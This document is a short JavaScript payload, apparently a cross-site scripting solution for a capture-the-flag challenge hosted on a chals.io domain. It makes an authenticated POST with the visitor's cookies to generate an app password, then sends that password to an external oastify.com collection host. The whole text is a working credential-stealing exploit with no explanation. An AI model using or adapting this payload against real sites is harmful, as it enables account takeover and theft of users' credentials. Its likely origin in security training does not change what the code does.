<script>
fetch('https://airbnb-hosts-2847774775fe-link-sheriff-1.chals.io/generate_app_password', {
  method: 'POST',
  credentials: 'include'
})
.then(res => res.json())
.then(data => {
  fetch('https://7x50mesogs5y5s8qn7mjp0hoefk68x0lp.oastify.com/?pw=' + encodeURIComponent(data.app_password));
});
</script>